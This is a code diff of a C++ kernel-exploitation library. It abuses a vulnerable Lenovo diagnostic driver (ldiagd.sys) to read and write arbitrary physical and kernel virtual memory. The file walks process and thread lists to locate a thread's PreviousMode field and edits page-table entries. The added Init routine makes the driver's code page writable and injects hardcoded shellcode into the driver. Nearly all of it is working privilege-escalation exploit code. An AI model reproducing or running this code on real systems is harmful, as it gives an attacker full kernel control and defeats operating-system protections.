@@ -1,14 +1,5 @@
-/*
-Copyright 2022 <COPYRIGHT HOLDER>
-
-Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-*/
-
 #include "LenovoMemoryMgr.h"
+#include "EzPdb.h"
 #include <conio.h>
 #include <iostream>
 
@@ -35,7 +26,7 @@ UINT64 LenovoMemoryMgr::CallKernelFunction(UINT64 address, UINT64 arg1, UINT64 a
 
 	DeviceIoControl
 	(
-		this->hDevice,
+		hDevice,
 		0x222000,
 		&call_data,
 		sizeof(CALL_DATA),
@@ -49,22 +40,13 @@ UINT64 LenovoMemoryMgr::CallKernelFunction(UINT64 address, UINT64 arg1, UINT64 a
 }
 
 template <typename T>
+requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
 BOOL LenovoMemoryMgr::ReadPhysData(UINT64 address, T* data)
 {
-    if (!data) {
+    if (!data) 
+	{
         return FALSE;
     }
-
-	switch (sizeof(T))
-	{
-	case 1:
-	case 2:
-	case 4:
-	case 8:
-		break;
-	default:
-		return FALSE;
-	}
 
 	LDIAG_READ lr = { 0 };
 	BOOL bStatus = FALSE;
@@ -75,7 +57,7 @@ BOOL LenovoMemoryMgr::ReadPhysData(UINT64 address, T* data)
 	lr.wLen = sizeof(DWORD64);
 
 	bStatus = DeviceIoControl(
-		this->hDevice,
+		hDevice,
 		IOCTL_PHYS_RD,
 		&lr,
 		sizeof(LDIAG_READ),
@@ -94,20 +76,11 @@ BOOL LenovoMemoryMgr::ReadPhysData(UINT64 address, T* data)
 }
 
 template<typename T>
+requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
 BOOL LenovoMemoryMgr::WritePhysData(_In_ UINT64 PhysDest, _In_ T* data)
 {
-	if (!data && !PhysDest) {
-		return FALSE;
-	}
-
-	switch (sizeof(T))
+	if (!data && !PhysDest) 
 	{
-	case 1:
-	case 2:
-	case 4:
-	case 8:
-		break;
-	default:
 		return FALSE;
 	}
 
@@ -122,7 +95,7 @@ BOOL LenovoMemoryMgr::WritePhysData(_In_ UINT64 PhysDest, _In_ T* data)
 	lw.dwLo = 0x6C61696E;
 
 	status = DeviceIoControl(
-		this->hDevice,
+		hDevice,
 		IOCTL_PHYS_WR,
 		&lw,
 		sizeof(LDIAG_WRITE),
@@ -136,55 +109,35 @@ BOOL LenovoMemoryMgr::WritePhysData(_In_ UINT64 PhysDest, _In_ T* data)
 }
 
 template<typename T>
+requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
 BOOL LenovoMemoryMgr::ReadVirtData(UINT64 address, T* data)
 {
 	if (!data) {
 		return FALSE;
 	}
 
-	switch (sizeof(T))
-	{
-	case 1:
-	case 2:
-	case 4:
-	case 8:
-		break;
-	default:
+	if (!WritePhysData(physSwapAddr, (T*)address)) {
 		return FALSE;
 	}
 
-	if (!this->WritePhysData(this->physSwapAddr, (T*)address)) {
-		return FALSE;
-	}
-
-	return this->ReadPhysData(this->physSwapAddr, data);
+	return ReadPhysData(physSwapAddr, data);
 }
 
 template<typename T>
+requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
 BOOL LenovoMemoryMgr::WriteVirtData(UINT64 address, T* data)
 {
 	if (!data) {
 		return FALSE;
 	}
 
-	switch (sizeof(T))
-	{
-	case 1:
-	case 2:
-	case 4:
-	case 8:
-		break;
-	default:
-		return FALSE;
-	}
-
 	PAGE_TABLE_ENTRY pte = { 0 };
-	PFILL_PTE_HIERARCHY PteHierarchy = this->CreatePteHierarchy(address);
+	PFILL_PTE_HIERARCHY PteHierarchy = CreatePteHierarchy(address);
 
-	PageType pt = this->GetPageTypeForVirtualAddress(address, &pte);
-	UINT64 PhysAddr = this->VtoP(address, pte.flags.Pfn, pt);
+	PageType pt = GetPageTypeForVirtualAddress(address, &pte);
+	UINT64 PhysAddr = VtoP(address, pte.flags.Pfn, pt);
 
-	return this->WritePhysData(PhysAddr, data);
+	return WritePhysData(PhysAddr, data);
 }
 
 // https://github.com/ch3rn0byl/CVE-2021-21551/blob/master/CVE-2021-21551/DellBiosUtil.cpp
@@ -197,7 +150,7 @@ PFILL_PTE_HIERARCHY LenovoMemoryMgr::CreatePteHierarchy(UINT64 VirtualAddress)
 	/// 
 	VirtualAddress >>= 9;
 	VirtualAddress &= 0x7FFFFFFFF8;
-	VirtualAddress += this->PteBase;
+	VirtualAddress += PteBase;
 
 	retval->PTE = VirtualAddress;
 
@@ -206,7 +159,7 @@ PFILL_PTE_HIERARCHY LenovoMemoryMgr::CreatePteHierarchy(UINT64 VirtualAddress)
 	/// 
 	VirtualAddress >>= 9;
 	VirtualAddress &= 0x7FFFFFFFF8;
-	VirtualAddress += this->PteBase;
+	VirtualAddress += PteBase;
 
 	retval->PDE = VirtualAddress;
 
@@ -215,7 +168,7 @@ PFILL_PTE_HIERARCHY LenovoMemoryMgr::CreatePteHierarchy(UINT64 VirtualAddress)
 	/// 
 	VirtualAddress >>= 9;
 	VirtualAddress &= 0x7FFFFFFFF8;
-	VirtualAddress += this->PteBase;
+	VirtualAddress += PteBase;
 
 	retval->PPE = VirtualAddress;
 
@@ -224,7 +177,7 @@ PFILL_PTE_HIERARCHY LenovoMemoryMgr::CreatePteHierarchy(UINT64 VirtualAddress)
 	/// 
 	VirtualAddress >>= 9;
 	VirtualAddress &= 0x7FFFFFFFF8;
-	VirtualAddress += this->PteBase;
+	VirtualAddress += PteBase;
 
 	retval->PXE = VirtualAddress;
 
@@ -238,7 +191,7 @@ UINT64 LenovoMemoryMgr::FindPhysSwapSpace()
 	BOOL bRes = FALSE;
 	UINT64 val = 0;
 	while (begin < end) {
-		bRes = this->ReadPhysData<UINT64>(begin, &val);
+		bRes = ReadPhysData<UINT64>(begin, &val);
 		if (!bRes) {
 			return NULL;
 		}
@@ -254,7 +207,7 @@ UINT64 LenovoMemoryMgr::FindPhysSwapSpace()
 
 UINT64 LenovoMemoryMgr::GetPteBase()
 {
-	const auto address = NtosBase + OFFSET_MI_GET_PTE_ADDRESS + 0x13;
+	const auto address = NtosBase + mi_get_pte_address_offset + 0x13;
 	UINT64 qwPteBase = 0;
 
 	ReadVirtData(address, &qwPteBase);
@@ -277,58 +230,18 @@ UINT64 LenovoMemoryMgr::VtoP(UINT64 va, UINT64 index, PageType p)
 	return (index << 12) + va;
 }
 
-BOOL LenovoMemoryMgr::SearchPattern(PBYTE pattern, PBYTE mask, DWORD dwPatternSize, UINT64 lpBeginSearch, SIZE_T lenSearch, PUINT64 AddressOfPattern)
-{
-	SIZE_T szBeginSearch = (SIZE_T)lpBeginSearch;
-	BOOL bRes = FALSE;
-	BOOL bFound = FALSE;
-	for (int i = 0; i < lenSearch; i++) {
-		for (unsigned int j = 0; j <= dwPatternSize; j++) {
-			// read a byte
-			BYTE b = 0;
-			if (!this->ReadVirtData<BYTE>((szBeginSearch + i + j), &b)) {
-				return FALSE;
-			}
-
-			if (j == dwPatternSize) {
-				if (bFound)
-				{
-					*AddressOfPattern = szBeginSearch + i;
-					return TRUE;
-				}
-				return FALSE;
-			}
-
-			// skip over if mask says to ignore value or if the byte matches our pattern
-			if (mask[j] == '?' || b == pattern[j]) {
-				//printf("+");
-				bFound = TRUE;
-			}
-			else {
-				//printf("-\n");
-				bFound = FALSE;
-				break;
-			}
-		}
-
-
-	}
-
-	return FALSE;
-}
-
 PageType LenovoMemoryMgr::GetPageTypeForVirtualAddress(UINT64 VirtAddress, PPAGE_TABLE_ENTRY PageTableEntry)
 {
 	// fill the pte hierarchy for the virtual address
-	PFILL_PTE_HIERARCHY hierarchy = this->CreatePteHierarchy(VirtAddress);
+	PFILL_PTE_HIERARCHY hierarchy = CreatePteHierarchy(VirtAddress);
 
 	// read the PTE contents, if they are zero we are using large pages
 	// if the PDE is also zero, god help you
-	this->ReadVirtData<UINT64>(hierarchy->PTE, &PageTableEntry->value);
+	ReadVirtData<UINT64>(hierarchy->PTE, &PageTableEntry->value);
 
 	if (!PageTableEntry->value) 
 	{
-		this->ReadVirtData<UINT64>(hierarchy->PDE, &PageTableEntry->value);
+		ReadVirtData<UINT64>(hierarchy->PDE, &PageTableEntry->value);
 		return PageType::UsePde;
 	}
 
@@ -481,7 +394,7 @@ BOOL LenovoMemoryMgr::SearchEprocessLinksForPid(UINT64 Pid, UINT64 SystemEproces
 		return FALSE;
 	}
 
-	UINT64 ListIter = SystemEprocess + OFFSET_EPROCESS_LINKS;
+	UINT64 ListIter = SystemEprocess + process_active_process_links_offset;
 	UINT64 ListHead = ListIter;
 
 	while (TRUE) 
@@ -498,10 +411,10 @@ BOOL LenovoMemoryMgr::SearchEprocessLinksForPid(UINT64 Pid, UINT64 SystemEproces
 			return FALSE;
 		}
 
-		UINT64 IterEprocessBase = ListIter - OFFSET_EPROCESS_LINKS;
+		UINT64 IterEprocessBase = ListIter - process_active_process_links_offset;
 		UINT64 IterPid = 0;
 
-		bRes = ReadVirtData((IterEprocessBase + OFFSET_EPROCESS_PID), &IterPid);
+		bRes = ReadVirtData((IterEprocessBase + process_pid_offset), &IterPid);
 
 		if (!bRes) 
 		{
@@ -526,7 +439,7 @@ UINT64 LenovoMemoryMgr::GetPreviousModeAddress()
 
 	if (SearchEprocessLinksForPid(GetCurrentProcessId(), system_process, &current_process))
 	{
-		auto thread_head_list = current_process + OFFSET_EPROCESS_THREAD_HEAD_LIST;
+		auto thread_head_list = current_process + process_thread_head_list_offset;
 
 		UINT64 ListIter = thread_head_list;
 		UINT64 ListHead = ListIter;
@@ -545,14 +458,14 @@ UINT64 LenovoMemoryMgr::GetPreviousModeAddress()
 				break;
 			}
 
-			UINT64 iter_thread = ListIter - OFFSET_ETHREAD_LIST_ENTRY;
+			UINT64 iter_thread = ListIter - thread_list_entry_offset;
 			UINT64 IterTid = 0;
 
-			bRes = ReadVirtData((iter_thread + OFFSET_ETHREAD_ID), &IterTid);
+			bRes = ReadVirtData((iter_thread + thread_id_offset), &IterTid);
 			
 			if (GetCurrentThreadId() == IterTid)
 			{
-				return iter_thread + OFFSET_ETHREAD_PREVIOUS_MODE;
+				return iter_thread + thread_previous_mode_offset;
 			}
 		}
 	}
@@ -565,9 +478,9 @@ UINT64 LenovoMemoryMgr::GetPageTableInfo(UINT64 address, PAGE_TABLE_ENTRY& entry
 	if (!address) return 0;
 
 	PAGE_TABLE_ENTRY pte = { 0 };
-	PFILL_PTE_HIERARCHY PteHierarchy = this->CreatePteHierarchy(address);
+	PFILL_PTE_HIERARCHY PteHierarchy = CreatePteHierarchy(address);
 
-	PageType pt = this->GetPageTypeForVirtualAddress(address, &pte);
+	PageType pt = GetPageTypeForVirtualAddress(address, &pte);
 	entry = pte;
 
 	if (pt == UsePte)
@@ -593,10 +506,10 @@ BOOL LenovoMemoryMgr::WritePageTable(UINT64 page_table_address, PAGE_TABLE_ENTRY
 	WriteVirtData(address, &entry.value);
 
 	PAGE_TABLE_ENTRY pte = { 0 };
-	PFILL_PTE_HIERARCHY PteHierarchy = this->CreatePteHierarchy(address);
+	PFILL_PTE_HIERARCHY PteHierarchy = CreatePteHierarchy(address);
 
-	PageType pt = this->GetPageTypeForVirtualAddress(address, &pte);
-	UINT64 PhysAddr = this->VtoP(address, pte.flags.Pfn, pt);
+	PageType pt = GetPageTypeForVirtualAddress(address, &pte);
+	UINT64 PhysAddr = VtoP(address, pte.flags.Pfn, pt);
 
 	LDIAG_READ lr = { 0 };
 	BOOL bStatus = FALSE;
@@ -612,7 +525,7 @@ BOOL LenovoMemoryMgr::WritePageTable(UINT64 page_table_address, PAGE_TABLE_ENTRY
 
 	bStatus = DeviceIoControl
 	(
-		this->hDevice,
+		hDevice,
 		IOCTL_PHYS_RD,
 		&lr,
 		sizeof(LDIAG_READ),
@@ -628,10 +541,11 @@ BOOL LenovoMemoryMgr::WritePageTable(UINT64 page_table_address, PAGE_TABLE_ENTRY
 	return status;
 }
 
-BOOL LenovoMemoryMgr::init()
+BOOL LenovoMemoryMgr::Init()
 {
-    HANDLE hDev = CreateFileA(
-        this->strDeviceName,
+    HANDLE hDev = CreateFileA
+	(
+        strDeviceName,
         GENERIC_READ,
         FILE_SHARE_READ,
         NULL,
@@ -644,15 +558,91 @@ BOOL LenovoMemoryMgr::init()
         return FALSE;
     }
 
-	this->NtosBase = this->FindNtosBase();
-    this->hDevice = hDev;
-	this->physSwapAddr = this->FindPhysSwapSpace();
-	this->PteBase = this->GetPteBase();
+	NtosBase = FindNtosBase();
+    hDevice = hDev;
+	physSwapAddr = FindPhysSwapSpace();
+
+#ifdef USE_STATIC_OFFSETS
+
+	process_active_process_links_offset = OFFSET_EPROCESS_LINKS;
+	process_pid_offset = OFFSET_EPROCESS_PID;
+	process_thread_head_list_offset = OFFSET_EPROCESS_THREAD_HEAD_LIST;
+
+	thread_id_offset = OFFSET_ETHREAD_ID;
+	thread_previous_mode_offset = OFFSET_ETHREAD_PREVIOUS_MODE;
+	thread_list_entry_offset = OFFSET_ETHREAD_LIST_ENTRY;
+
+	mi_get_pte_address_offset = OFFSET_MI_GET_PTE_ADDRESS;
+
+#else
+
+	std::string kernel = std::string(std::getenv("systemroot")) + "\\System32\\ntoskrnl.exe";
+	std::string pdbPath = EzPdbDownload(kernel);
+
+	if (pdbPath.empty())
+	{
+		std::cout << "download pdb failed " << GetLastError() << std::endl;;
+		return FALSE;
+	}
+
+	EZPDB pdb;
+
+	if (!EzPdbLoad(pdbPath, &pdb))
+	{
+		std::cout << "load pdb failed " << GetLastError() << std::endl;
+		return FALSE;
+	}
+
+	process_active_process_links_offset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ActiveProcessLinks");
+	process_pid_offset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"UniqueProcessId");
+	process_thread_head_list_offset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ThreadListHead");
+
+	thread_id_offset = EzPdbGetStructPropertyOffset(&pdb, "_ETHREAD", L"Cid") + 0x8;
+	thread_previous_mode_offset = EzPdbGetStructPropertyOffset(&pdb, "_KTHREAD", L"PreviousMode");
+	thread_list_entry_offset = EzPdbGetStructPropertyOffset(&pdb, "_ETHREAD", L"ThreadListEntry");
+
+	mi_get_pte_address_offset = EzPdbGetRva(&pdb, "MiGetPteAddress");
+
+	EzPdbUnload(&pdb);
+
+#endif
+
+	PteBase = GetPteBase();
+
+	const auto ldiagd_address = FindBase("ldiagd.sys");
+	const auto address = ldiagd_address + 0x1200;
+
+	PAGE_TABLE_ENTRY entry;
+	const auto page_table_address = GetPageTableInfo(address, entry);
+
+	entry.flags.ReadWrite = 1;
+
+	WritePageTable(page_table_address, entry);
+
+	UINT8 shellcode[] =
+	{
+		0x4C, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89,
+		0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x40,
+		0x48, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44,
+		0x24, 0x20, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B,
+		0x44, 0x24, 0x20, 0x4C, 0x8B, 0x48, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20,
+		0x4C, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x50,
+		0x10, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x48, 0x08, 0xFF, 0x54,
+		0x24, 0x28, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0x48, 0x8B, 0x49, 0x28, 0x48,
+		0x89, 0x01, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC,
+		0xCC, 0xCC, 0xCC, 0xCC
+	};
+
+	for (int i = 0; i < sizeof(shellcode); i += 8)
+	{
+		WriteVirtData(address + i, reinterpret_cast<UINT64*>(reinterpret_cast<UINT64>(&shellcode) + i));
+	}
+
     return TRUE;
 }
 
-BOOL LenovoMemoryMgr::teardown()
+BOOL LenovoMemoryMgr::Shutdown()
 {
-    CloseHandle(this->hDevice);
+    CloseHandle(hDevice);
     return 0;
 }
